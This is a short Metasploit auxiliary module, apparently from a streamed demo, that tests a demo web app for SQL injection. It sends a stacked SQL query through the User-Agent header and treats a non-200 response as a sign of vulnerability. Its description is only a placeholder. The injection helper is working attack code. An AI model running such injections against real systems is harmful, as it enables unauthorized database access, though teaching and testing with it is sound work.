require 'csv'

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Twitch Demo SQLi',
      'Description' => '
        Helloooo
      ',
      'License' => MSF_LICENSE,
      'Author' =>
        [
          'MDI'
        ],
      'References' => [
        ['CVE', '2018-17179'],
        ['URL', 'https://twitter.com/mdisec']
      ],
      'DisclosureDate' => 'May 17 2019'
    ))

    register_options(
      [
        Opt::RPORT(5000),
        OptString.new('TARGETURI', [true, 'The base path to the Twitch demo', '/'])
      ]
    )
  end

  def sqli(query)
    rand = Rex::Text.rand_text_alpha(5)
    query = "#{rand}';#{query};--"
    vprint_status(query)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/'),
      'headers' => {
        'User-Agent' => "#{query}'",
      }
    })
    return res
  end

  def check
    res = sqli("'")
    if res && res.code == 200
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Vulnerable
    end
  end

  def run
    unless check == Exploit::CheckCode::Vulnerable
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end

    print_good(" HER SEY COK GUZEL !")

  end
end
